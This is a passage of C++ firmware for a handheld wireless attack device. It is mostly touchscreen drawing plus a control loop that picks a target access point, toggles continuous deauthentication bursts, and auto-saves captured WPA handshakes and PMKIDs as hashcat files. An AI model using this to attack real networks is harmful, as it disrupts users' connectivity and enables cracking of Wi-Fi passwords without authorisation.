    titleSSID[maxTitle] = '\0';
    drawGlitchText(SCALE_Y(55), titleSSID, &Nosifer_Regular10pt7b);
    tft.drawLine(0, SCALE_Y(58), SCREEN_WIDTH, SCALE_Y(58), HALEHOUND_MAGENTA);

    // Target info frame
    tft.drawRoundRect(5, SCALE_Y(62), GRAPH_PADDED_W, SCALE_H(30), 6, HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, SCALE_Y(67));
    tft.print("CH:");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("%d", apList[selectedAP].channel);

    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(SCALE_X(55), SCALE_Y(67));
    tft.print("BSSID:");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
               apList[selectedAP].bssid[0], apList[selectedAP].bssid[1],
               apList[selectedAP].bssid[2], apList[selectedAP].bssid[3],
               apList[selectedAP].bssid[4], apList[selectedAP].bssid[5]);

    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, SCALE_Y(80));
    tft.print("RSSI:");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("%d", apList[selectedAP].rssi);

    // Section labels
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, SCALE_Y(100));
    tft.print("HANDSHAKE:");
    tft.setCursor(10, SCALE_Y(128));
    tft.print("PMKID:");
    tft.setCursor(10, SCALE_Y(156));
    tft.print("PACKETS:");
    tft.setCursor(10, SCALE_Y(170));
    tft.print("EAPOL:");
    tft.setCursor(10, SCALE_Y(184));
    tft.print("TIME:");

    tft.drawLine(5, SCALE_Y(198), GRAPH_PADDED_W, SCALE_Y(198), HALEHOUND_MAGENTA);

    // Status area label
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, SCALE_Y(205));
    tft.print("STATUS:");

    tft.drawLine(5, EC_DEAUTH_Y - 10, GRAPH_PADDED_W, EC_DEAUTH_Y - 10, HALEHOUND_MAGENTA);

    // Deauth button — skull icon + text
    tft.drawRoundRect(EC_DEAUTH_X, EC_DEAUTH_Y, EC_DEAUTH_W, EC_DEAUTH_H, 6, HALEHOUND_HOTPINK);
    tft.drawRoundRect(EC_DEAUTH_X + 1, EC_DEAUTH_Y + 1, EC_DEAUTH_W - 2, EC_DEAUTH_H - 2, 5, HALEHOUND_HOTPINK);
    tft.drawBitmap(EC_DEAUTH_X + 8, EC_DEAUTH_Y + 8, bitmap_icon_skull_wifi, 16, 16, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(EC_DEAUTH_X + 30, EC_DEAUTH_Y + 12);
    tft.print("DEAUTH");

    // Save button (dimmed until we have something) — SD card icon + text
    tft.drawRoundRect(EC_SAVE_X, EC_SAVE_Y, EC_SAVE_W, EC_SAVE_H, 6, HALEHOUND_GUNMETAL);
    tft.drawBitmap(EC_SAVE_X + 8, EC_SAVE_Y + 8, bitmap_icon_sdcard, 16, 16, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setCursor(EC_SAVE_X + 30, EC_SAVE_Y + 12);
    tft.print("SAVE");
}

static void updateCaptureDisplay() {
    tft.setTextSize(1);

    // ── Handshake message indicators ──
    // Draw as boxes: [M1] [M2] [M3] [M4]
    int hsY = SCALE_Y(97);
    tft.fillRect(SCALE_X(85), hsY, SCALE_W(150), 16, HALEHOUND_BLACK);

    int mx = SCALE_X(85);
    int mboxW = SCALE_W(30);
    int mboxGap = SCALE_W(35);
    uint16_t m1c = hasMsg1 ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    uint16_t m2c = hasMsg2 ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    uint16_t m3c = hasMsg3 ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    uint16_t m4c = hasMsg4 ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;

    tft.drawRect(mx, hsY + 1, mboxW, 14, m1c);
    tft.setTextColor(m1c);
    tft.setCursor(mx + 6, hsY + 3);
    tft.print("M1");
    mx += mboxGap;

    tft.drawRect(mx, hsY + 1, mboxW, 14, m2c);
    tft.setTextColor(m2c);
    tft.setCursor(mx + 6, hsY + 3);
    tft.print("M2");
    mx += mboxGap;

    tft.drawRect(mx, hsY + 1, mboxW, 14, m3c);
    tft.setTextColor(m3c);
    tft.setCursor(mx + 6, hsY + 3);
    tft.print("M3");
    mx += mboxGap;

    tft.drawRect(mx, hsY + 1, mboxW, 14, m4c);
    tft.setTextColor(m4c);
    tft.setCursor(mx + 6, hsY + 3);
    tft.print("M4");

    // Handshake complete indicator
    if (hasHandshake) {
        tft.fillRect(SCALE_X(85), SCALE_Y(113), SCALE_W(150), 10, HALEHOUND_BLACK);
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(SCALE_X(85), SCALE_Y(113));
        tft.print("CAPTURED!");
    }

    // ── PMKID status ──
    tft.fillRect(SCALE_X(55), SCALE_Y(125), SCALE_W(180), 16, HALEHOUND_BLACK);
    tft.setCursor(SCALE_X(55), SCALE_Y(128));
    if (hasPMKID) {
        if (blinkState) {
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.print("FOUND!");
        } else {
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.print("FOUND!");
        }
        // Show first 8 bytes
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(SCALE_X(105), SCALE_Y(128));
        char pmkidPreview[17];
        bytesToHex(pmkidBytes, 8, pmkidPreview);
        tft.print(pmkidPreview);
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.print("Waiting...");
    }

    // ── Stats ──
    tft.fillRect(SCALE_X(65), SCALE_Y(153), SCALE_W(170), SCALE_H(40), HALEHOUND_BLACK);

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(SCALE_X(65), SCALE_Y(156));
    tft.print(packetCount);

    tft.setCursor(SCALE_X(65), SCALE_Y(170));
    tft.print(eapolCount);

    // Elapsed time
    unsigned long elapsed = (millis() - captureStartTime) / 1000;
    tft.setCursor(SCALE_X(65), SCALE_Y(184));
    tft.printf("%lum %lus", elapsed / 60, elapsed % 60);

    // ── Status message ──
    int statusAreaY = SCALE_Y(200);
    int statusAreaH = EC_DEAUTH_Y - 10 - statusAreaY;
    tft.fillRect(5, statusAreaY, GRAPH_PADDED_W, statusAreaH, HALEHOUND_BLACK);

    if (hasPMKID && hasHandshake) {
        tft.setCursor(10, SCALE_Y(220));
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.print("PMKID + Handshake captured!");
        tft.setCursor(10, SCALE_Y(234));
        tft.print("Tap SAVE for hashcat file");
    } else if (hasPMKID) {
        tft.setCursor(10, SCALE_Y(220));
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.print("PMKID captured!");
        tft.setCursor(10, SCALE_Y(234));
        tft.print("Tap SAVE or wait for handshake");
    } else if (hasHandshake) {
        tft.setCursor(10, SCALE_Y(220));
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.print("Handshake captured!");
        tft.setCursor(10, SCALE_Y(234));
        tft.print("Tap SAVE for hashcat file");
    } else if (deauthRunning) {
        // Animated skull spinner with HaleHound gradient
        uint16_t color = gradientColors[deauthAnimFrame % GRADIENT_COUNT];
        tft.drawBitmap(10, SCALE_Y(205), skullFrames[deauthAnimFrame % SKULL_FRAME_COUNT], 16, 16, color);
        tft.setTextSize(2);
        tft.setTextColor(color);
        tft.setCursor(32, SCALE_Y(207));
        tft.print("DEAUTHING");
        tft.setTextSize(1);
        // Show burst count below
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(32, SCALE_Y(228));
        tft.printf("CH:%d  %d frames/burst", apList[selectedAP].channel, EC_DEAUTH_BURST);
        // Progress dots in gradient
        int dotX = 10;
        for (int d = 0; d < GRADIENT_COUNT; d++) {
            uint16_t dc = (d <= deauthAnimFrame % GRADIENT_COUNT) ? gradientColors[d] : HALEHOUND_GUNMETAL;
            tft.fillCircle(dotX + (d * SCALE_X(12)), SCALE_Y(244), 3, dc);
        }
        deauthAnimFrame++;
    } else if (eapolCount > 0) {
        tft.setCursor(10, SCALE_Y(220));
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.print("EAPOL frames detected...");
        tft.setCursor(10, SCALE_Y(234));
        tft.print("Waiting for full handshake");
    } else {
        tft.setCursor(10, SCALE_Y(220));
        tft.setTextColor(HALEHOUND_GUNMETAL);
        if (blinkState) {
            tft.print("Listening...");
        } else {
            tft.print("Tap DEAUTH to force reauth");
        }
    }

    // ── Update Save button color if we have captures ──
    if ((hasPMKID || hasHandshake) && !savedPMKID && !savedHandshake) {
        tft.drawRoundRect(EC_SAVE_X, EC_SAVE_Y, EC_SAVE_W, EC_SAVE_H, 6, HALEHOUND_MAGENTA);
        tft.drawRoundRect(EC_SAVE_X + 1, EC_SAVE_Y + 1, EC_SAVE_W - 2, EC_SAVE_H - 2, 5, HALEHOUND_MAGENTA);
        tft.drawBitmap(EC_SAVE_X + 8, EC_SAVE_Y + 8, bitmap_icon_sdcard, 16, 16, HALEHOUND_MAGENTA);
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(EC_SAVE_X + 30, EC_SAVE_Y + 12);
        tft.print("SAVE");
    } else if (savedPMKID || savedHandshake) {
        tft.drawRoundRect(EC_SAVE_X, EC_SAVE_Y, EC_SAVE_W, EC_SAVE_H, 6, HALEHOUND_MAGENTA);
        tft.drawBitmap(EC_SAVE_X + 8, EC_SAVE_Y + 8, bitmap_icon_save, 16, 16, HALEHOUND_MAGENTA);
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(EC_SAVE_X + 30, EC_SAVE_Y + 12);
        tft.print("SAVED");
    }
}

static bool isDeauthTapped() {
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (tx >= EC_DEAUTH_X && tx <= EC_DEAUTH_X + EC_DEAUTH_W &&
            ty >= EC_DEAUTH_Y && ty <= EC_DEAUTH_Y + EC_DEAUTH_H) {
            delay(200);
            return true;
        }
    }
    return false;
}

static bool isSaveTapped() {
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (tx >= EC_SAVE_X && tx <= EC_SAVE_X + EC_SAVE_W &&
            ty >= EC_SAVE_Y && ty <= EC_SAVE_Y + EC_SAVE_H) {
            delay(200);
            return true;
        }
    }
    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC API
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    // Reset all state
    currentPhase = PHASE_SCAN;
    exitRequested = false;
    selectedAP = -1;
    ecCurrentPage = 0;
    apCount = 0;
    packetCount = 0;
    eapolCount = 0;
    hasMsg1 = hasMsg2 = hasMsg3 = hasMsg4 = false;
    hasPMKID = hasHandshake = false;
    savedPMKID = savedHandshake = false;
    notifiedCapture = false;
    deauthRunning = false;
    deauthAnimFrame = 0;
    lastDeauthSend = 0;
    scanReturnTime = 0;
    msg1Len = msg2Len = beaconLen = 0;
    memset(pmkidBytes, 0, sizeof(pmkidBytes));
    memset(anonceBytes, 0, sizeof(anonceBytes));
    memset(micBytes, 0, sizeof(micBytes));
    memset(staMAC, 0, sizeof(staMAC));

    // Init SD
    initSD();

    // Draw scan screen and run scan
    drawScanScreen();
    runAPScan();
    drawAPList();
}

void loop() {
    if (exitRequested) return;

    touchButtonsUpdate();

    // Check back button
    if (isECBackTapped() || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        Serial.printf("[EAPOL-BACK] FIRED phase=%d (0=SCAN,1=CAPTURE)\n", currentPhase);
        if (currentPhase == PHASE_CAPTURE) {
            Serial.println("[EAPOL-BACK] CAPTURE->SCAN transition starting");
            // Auto-save if we have captures
            if ((hasPMKID || hasHandshake) && !savedPMKID && !savedHandshake) {
                saveCaptures();
            }
            // Back to AP list — full WiFi teardown required because
            // initPromiscuous() used raw ESP-IDF APSTA mode which desyncs
            // Arduino's _esp_wifi_started flag.
            deauthRunning = false;
            notifiedCapture = false;
            wifiFullDeinit();
            currentPhase = PHASE_SCAN;
            ecCurrentPage = 0;
            packetCount = 0;
            eapolCount = 0;
            hasMsg1 = hasMsg2 = hasMsg3 = hasMsg4 = false;
            hasPMKID = hasHandshake = false;
            savedPMKID = savedHandshake = false;
            msg1Len = msg2Len = beaconLen = 0;

            drawScanScreen();
            Serial.println("[EAPOL-BACK] runAPScan starting...");
            runAPScan();
            Serial.printf("[EAPOL-BACK] runAPScan done, found %d APs\n", apCount);
            drawAPList();
            scanReturnTime = millis();
            waitForTouchRelease();
            Serial.println("[EAPOL-BACK] waitForTouchRelease done, returning to scan loop");
            return;
        }
        // Guard: block exit for 1s after returning to scan from capture
        // Prevents double-fire from residual touch/debounce issues
        if (scanReturnTime > 0 && (millis() - scanReturnTime < 1000)) {
            Serial.printf("[EAPOL-BACK] EXIT BLOCKED — only %lums since scan return\n",
                          millis() - scanReturnTime);
            return;
        }
        Serial.println("[EAPOL-BACK] SCAN->EXIT");
        exitRequested = true;
        return;
    }

    if (currentPhase == PHASE_SCAN) {
        // Check for AP selection or page navigation touch
        int tapped = checkAPListTouch();
        if (tapped == -2) {
            // Prev page
            ecCurrentPage--;
            drawAPList();
            waitForTouchRelease();
            return;
        }
        if (tapped == -3) {
            // Next page
            ecCurrentPage++;
            drawAPList();
            waitForTouchRelease();
            return;
        }
        if (tapped >= 0) {
            Serial.printf("[EAPOL] AP selected: %d '%s' auth=%d ch=%d\n",
                          tapped, apList[tapped].ssid, apList[tapped].authMode, apList[tapped].channel);
            selectedAP = tapped;
            currentPhase = PHASE_CAPTURE;
            captureStartTime = millis();
            // Start promiscuous capture
            initPromiscuous();

            // Draw capture screen
            drawCaptureScreen();
            updateCaptureDisplay();
        }
    } else {
        // CAPTURE PHASE

        // Deauth toggle button — tap to start continuous deauth, tap again to stop
        if (isDeauthTapped()) {
            deauthRunning = !deauthRunning;
            Serial.printf("[EAPOL] DEAUTH %s\n", deauthRunning ? "STARTED" : "STOPPED");
            // Redraw button with current state
            tft.fillRoundRect(EC_DEAUTH_X + 2, EC_DEAUTH_Y + 2,
                              EC_DEAUTH_W - 4, EC_DEAUTH_H - 4, 4, HALEHOUND_BLACK);
            if (deauthRunning) {
                tft.drawRoundRect(EC_DEAUTH_X, EC_DEAUTH_Y, EC_DEAUTH_W, EC_DEAUTH_H, 6, HALEHOUND_MAGENTA);
                tft.drawRoundRect(EC_DEAUTH_X + 1, EC_DEAUTH_Y + 1, EC_DEAUTH_W - 2, EC_DEAUTH_H - 2, 5, HALEHOUND_MAGENTA);
                tft.fillRoundRect(EC_DEAUTH_X + 2, EC_DEAUTH_Y + 2,
                                  EC_DEAUTH_W - 4, EC_DEAUTH_H - 4, 4, HALEHOUND_MAGENTA);
                tft.drawBitmap(EC_DEAUTH_X + 8, EC_DEAUTH_Y + 8, bitmap_icon_skull_wifi, 16, 16, HALEHOUND_BLACK);
                tft.setTextColor(HALEHOUND_BLACK);
                tft.setCursor(EC_DEAUTH_X + 30, EC_DEAUTH_Y + 12);
                tft.print("STOP");
                lastDeauthSend = 0;  // Send immediately
            } else {
                tft.drawRoundRect(EC_DEAUTH_X, EC_DEAUTH_Y, EC_DEAUTH_W, EC_DEAUTH_H, 6, HALEHOUND_HOTPINK);
                tft.drawRoundRect(EC_DEAUTH_X + 1, EC_DEAUTH_Y + 1, EC_DEAUTH_W - 2, EC_DEAUTH_H - 2, 5, HALEHOUND_HOTPINK);
                tft.drawBitmap(EC_DEAUTH_X + 8, EC_DEAUTH_Y + 8, bitmap_icon_skull_wifi, 16, 16, HALEHOUND_HOTPINK);
                tft.setTextColor(HALEHOUND_HOTPINK);
                tft.setCursor(EC_DEAUTH_X + 30, EC_DEAUTH_Y + 12);
                tft.print("DEAUTH");
            }
            delay(200);  // Debounce
        }

        // Continuous deauth sending when toggled on
        if (deauthRunning && (millis() - lastDeauthSend >= EC_DEAUTH_INTERVAL)) {
            sendDeauth();
            lastDeauthSend = millis();
        }

        // Save button — resets after saving so you can save again
        if (isSaveTapped() && (hasPMKID || hasHandshake)) {
            saveCaptures();
            // Flash save button — save icon on cyan
            tft.fillRoundRect(EC_SAVE_X + 2, EC_SAVE_Y + 2,
                              EC_SAVE_W - 4, EC_SAVE_H - 4, 4, HALEHOUND_MAGENTA);
            tft.drawBitmap(EC_SAVE_X + 8, EC_SAVE_Y + 8, bitmap_icon_save, 16, 16, HALEHOUND_BLACK);
            tft.setTextColor(HALEHOUND_BLACK);
            tft.setCursor(EC_SAVE_X + 30, EC_SAVE_Y + 12);
            tft.print("SAVED!");
            delay(500);
            // Reset saved flags so another capture can be saved
            savedPMKID = false;
            savedHandshake = false;
            notifiedCapture = false;  // Re-arm alert for next capture
            // Redraw save button back to normal — SD card icon
            tft.fillRoundRect(EC_SAVE_X + 2, EC_SAVE_Y + 2,
                              EC_SAVE_W - 4, EC_SAVE_H - 4, 4, HALEHOUND_BLACK);
            tft.drawRoundRect(EC_SAVE_X, EC_SAVE_Y, EC_SAVE_W, EC_SAVE_H, 6, HALEHOUND_MAGENTA);
            tft.drawRoundRect(EC_SAVE_X + 1, EC_SAVE_Y + 1, EC_SAVE_W - 2, EC_SAVE_H - 2, 5, HALEHOUND_MAGENTA);
            tft.drawBitmap(EC_SAVE_X + 8, EC_SAVE_Y + 8, bitmap_icon_sdcard, 16, 16, HALEHOUND_MAGENTA);
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(EC_SAVE_X + 30, EC_SAVE_Y + 12);
            tft.print("SAVE");
        }

        // Alert + auto-save on new capture
        if ((hasPMKID || hasHandshake) && !notifiedCapture) {
            notifiedCapture = true;
            Serial.println("[EAPOL] *** CAPTURE DETECTED — auto-saving ***");

            // Auto-save to SD immediately
            saveCaptures();

            // Flash big alert banner across the status area
            int alertY = SCALE_Y(200);
            int alertH = EC_DEAUTH_Y - 10 - alertY;
            for (int flash = 0; flash < 4; flash++) {
                tft.fillRect(5, alertY, GRAPH_PADDED_W, alertH, (flash % 2) ? HALEHOUND_BLACK : HALEHOUND_MAGENTA);
                tft.setTextSize(2);
                tft.setTextColor((flash % 2) ? HALEHOUND_MAGENTA : HALEHOUND_BLACK);
                if (hasPMKID && hasHandshake) {
                    tft.setCursor(15, SCALE_Y(207));
                    tft.print("PMKID +");
                    tft.setCursor(15, SCALE_Y(228));
                    tft.print("HANDSHAKE!");
                } else if (hasPMKID) {
                    tft.setCursor(30, SCALE_Y(215));
                    tft.print("PMKID!");
                } else {
                    tft.setCursor(15, SCALE_Y(215));
                    tft.print("HANDSHAKE!");
                }
                delay(250);
            }
            tft.setTextSize(1);

            // Show "AUTO-SAVED" on save button briefly — save icon on electric blue
            tft.fillRoundRect(EC_SAVE_X + 2, EC_SAVE_Y + 2,
                              EC_SAVE_W - 4, EC_SAVE_H - 4, 4, HALEHOUND_MAGENTA);
            tft.drawBitmap(EC_SAVE_X + 8, EC_SAVE_Y + 8, bitmap_icon_save, 16, 16, HALEHOUND_BLACK);
            tft.setTextColor(HALEHOUND_BLACK);
            tft.setCursor(EC_SAVE_X + 30, EC_SAVE_Y + 12);
            tft.print("SAVED");
            delay(500);

            // Reset saved flags so manual save works for next capture
            savedPMKID = false;
            savedHandshake = false;
            // Redraw save button normal — SD card icon
            tft.fillRoundRect(EC_SAVE_X + 2, EC_SAVE_Y + 2,
                              EC_SAVE_W - 4, EC_SAVE_H - 4, 4, HALEHOUND_BLACK);
            tft.drawRoundRect(EC_SAVE_X, EC_SAVE_Y, EC_SAVE_W, EC_SAVE_H, 6, HALEHOUND_MAGENTA);
            tft.drawRoundRect(EC_SAVE_X + 1, EC_SAVE_Y + 1, EC_SAVE_W - 2, EC_SAVE_H - 2, 5, HALEHOUND_MAGENTA);
            tft.drawBitmap(EC_SAVE_X + 8, EC_SAVE_Y + 8, bitmap_icon_sdcard, 16, 16, HALEHOUND_MAGENTA);
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(EC_SAVE_X + 30, EC_SAVE_Y + 12);
            tft.print("SAVE");

            // Force display refresh
            updateCaptureDisplay();
        }

        // Blink
        if (millis() - lastBlink >= EC_BLINK_MS) {
            blinkState = !blinkState;
            lastBlink = millis();
        }

        // Update display
        if (millis() - lastDisplayUpdate >= EC_DISPLAY_MS) {
            updateCaptureDisplay();
            lastDisplayUpdate = millis();
        }
    }

    delay(10);
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (currentPhase == PHASE_CAPTURE) {
        // Auto-save
        if ((hasPMKID || hasHandshake) && !savedPMKID && !savedHandshake) {
            saveCaptures();
        }
        stopPromiscuous();
    }
    wifiFullDeinit();
    exitRequested = false;
    currentPhase = PHASE_SCAN;
    ecCurrentPage = 0;
    deauthRunning = false;
    deauthAnimFrame = 0;
    lastDeauthSend = 0;
    savedPMKID = false;
    savedHandshake = false;
    notifiedCapture = false;
}

}  // namespace EapolCapture
